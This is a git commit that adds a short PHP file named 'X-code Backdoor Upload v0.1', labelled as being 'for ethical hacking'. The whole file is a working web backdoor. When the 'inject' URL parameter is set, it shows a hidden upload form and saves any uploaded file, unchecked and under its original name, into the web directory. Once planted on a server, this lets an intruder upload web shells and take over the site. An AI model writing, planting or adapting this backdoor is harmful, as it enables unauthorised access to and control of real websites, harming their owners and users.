8e11a9c5cc8d413f747531b8d5038cb3414da83b
Kurniawan <38490299+kurniawandata@users.noreply.github.com>
2020-05-20 17:10:29 +0700

    Create xcodebackdoorupload.php

---
+++ xcodebackdoorupload.php
@@ -0,0 +1,20 @@
+<?php 
+if(isset($_GET['inject']))
+{ 
+if(isset($_POST['cekfile']))
+{
+move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
+echo "Upload berhasil";
+}
+else
+{
+echo "<form enctype=\"multipart/form-data\" action=\"\" method=\"post\" >
+<h3><u>X-code Backdoor Upload v0.1 for ethical hacking</u></h3>
+Oleh : Kurniawan - xcode.or.id<br />
+Nama file : <input type=\"file\" name=\"file\" />
+<br />
+<input type=\"submit\" name=\"cekfile\" value=\"Upload\">
+</form>";
+ } 
+ }
+?>
